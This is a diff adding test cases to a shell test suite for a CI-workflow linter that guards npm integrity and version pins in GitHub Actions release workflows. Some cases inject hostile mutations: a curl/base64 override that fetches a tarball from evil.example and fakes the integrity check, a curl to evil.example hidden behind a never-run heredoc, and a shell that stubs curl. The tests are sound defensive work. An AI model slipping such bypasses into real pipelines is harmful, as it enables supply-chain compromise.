+	expect_caught 'a job setting npm_integrity in another case (#1000)' npmpin "$WORKFLOWS/sidecar-release.yml" \
+		$'  publish-sidecar:\n    # Same requirement' $'  publish-sidecar:\n    env:\n      npm_integrity: sha512-x\n    # Same requirement' \
+		'publish-sidecar: sets npm_integrity over the workflow pin'
+	expect_caught 'NPM_INTEGRITY set for later steps through GITHUB_ENV (#1000)' npmpin "$WORKFLOWS/release-exec.yml" \
+		$'          set -euo pipefail\n          # Checked where it is used' $'          set -euo pipefail\n          echo "NPM_INTEGRITY=sha512-x" >> "$GITHUB_ENV"\n          # Checked where it is used' \
+		'sets NPM_INTEGRITY in its script'
+	expect_caught 'the integrity pin not a sha512 (#1000)' npmpin "$WORKFLOWS/sidecar-release.yml" \
+		'  NPM_INTEGRITY: "sha512-' '  NPM_INTEGRITY: "sha1-x" #' \
+		'env.NPM_INTEGRITY is "sha1-x", not a sha512 integrity'
+	expect_caught 'the integrity pin gone from a workflow that installs npm (#1000)' npmpin "$WORKFLOWS/release-exec.yml" \
+		'  NPM_INTEGRITY: "sha512-' '  OLD_INTEGRITY: "sha512-' \
+		'the workflow installs npm but sets no NPM_INTEGRITY at the top'
+	expect_caught 'the npm tarball installed with its version pin gone (#1000)' npmpin "$WORKFLOWS/sidecar-release.yml" \
+		'  NPM_VERSION: "12.1.0"' '  OLD_VERSION: "12.1.0"' \
+		'the workflow installs npm but sets no NPM_VERSION at the top'
+	expect_caught 'curl and base64 redefined above the checks (#1000 security review)' npmpin "$WORKFLOWS/release-exec.yml" \
+		$'          set -euo pipefail\n          # Checked where it is used' $'          set -euo pipefail\n          if [ -n "${RUNNER_TEMP:-}" ]; then curl() { command curl -fsS -o "$npm_tgz" https://evil.example/npm.tgz; }; base64() { cat >/dev/null; printf %s "${NPM_INTEGRITY#sha512-}"; }; fi\n          # Checked where it is used' \
+		'pack-brain: step Install the pinned npm installs npm in a script that is not exactly the one this rule allows'
+	expect_caught 'the checks turned into a heredoc that never runs (#1000 security review)' npmpin "$WORKFLOWS/sidecar-release.yml" \
+		$'          set -euo pipefail\n          # Checked where it is used' $'          set -euo pipefail\n          curl -fsS -o /tmp/x.tgz https://evil.example/npm.tgz\n          : <<\'#\'\n          # Checked where it is used' \
+		'publish-sidecar: step Ensure npm supports Trusted Publishing installs npm in a script that is not exactly the one this rule allows'
+	expect_caught 'the install step given an env of its own (#1000 review)' npmpin "$WORKFLOWS/release-exec.yml" \
+		$'      - name: Install the pinned npm\n        run: |' $'      - name: Install the pinned npm\n        env:\n          X: "1"\n        run: |' \
+		'pack-brain: step Install the pinned npm installs npm in a step with a shell: or env: of its own'
+	expect_caught 'the install step run by a shell that runs code first (#1000 review)' npmpin "$WORKFLOWS/release-exec.yml" \
+		$'      - name: Install the pinned npm\n        run: |' $'      - name: Install the pinned npm\n        shell: bash -c \x27curl() { :; }; . {0}\x27\n        run: |' \
+		'pack-brain: step Install the pinned npm installs npm in a step with a shell: or env: of its own'
+	expect_caught 'the npm tarball installed with npm free to fetch more (#1000)' mutable "$WORKFLOWS/release-exec.yml" \
+		'          npm install -g --offline --ignore-scripts "$npm_tgz"' '          npm install -g --ignore-scripts "$npm_tgz"' \
+		'pack-brain: step Install the pinned npm: global install of $npm_tgz is not an exact version'
 }
 # The image publish-docker pushes is built FROM these (#783). A base by tag
 # alone is whatever the registry says that day, so every external FROM names a
@@ -1500,7 +1732,7 @@ expect_caught 'a short SHA on the publish path' pinned "$WORKFLOWS/sidecar-relea
 # shellcheck disable=SC2016 # literal workflow text, not shell.
 {
 	expect_caught 'npm@latest back in a job holding id-token' mutable "$WORKFLOWS/release-exec.yml" \
-		'npm install -g "npm@${NPM_VERSION}"' 'npm install -g npm@latest'
+		'npm install -g --offline --ignore-scripts "$npm_tgz"' 'npm install -g npm@latest'
 	expect_caught 'a floating Bun reached through env indirection' mutable "$WORKFLOWS/release-exec.yml" \
 		'  BUN_VERSION: "1.4.2"' '  BUN_VERSION: latest'
 	expect_caught 'a floating Bun in the job that can tag a release' mutable "$WORKFLOWS/release.yml" \
@@ -1526,9 +1758,9 @@ expect_caught 'a short SHA on the publish path' pinned "$WORKFLOWS/sidecar-relea
 		'          sbom: generator=${{ env.SBOM_GENERATOR }}' '          attests: type=sbom' \
 		'SBOM generator image is not pinned by digest ("default stable-1")'
 	expect_caught 'a global npm install with no version' mutable "$WORKFLOWS/sidecar-release.yml" \
-		'npm install -g "npm@${NPM_VERSION}"' 'npm install -g npm'
+		'npm install -g --offline --ignore-scripts "$npm_tgz"' 'npm install -g npm'
 	expect_caught 'a global npm install of a range' mutable "$WORKFLOWS/sidecar-release.yml" \
-		'npm install -g "npm@${NPM_VERSION}"' 'npm i -g npm@^12'
+		'npm install -g --offline --ignore-scripts "$npm_tgz"' 'npm i -g npm@^12'
 	expect_caught 'the npm pin itself loosened to a major' mutable "$WORKFLOWS/sidecar-release.yml" \
 		'  NPM_VERSION: "12.1.0"' '  NPM_VERSION: "12"'
 	expect_caught 'a Bun range in the job that can tag a release' mutable "$WORKFLOWS/release.yml" \
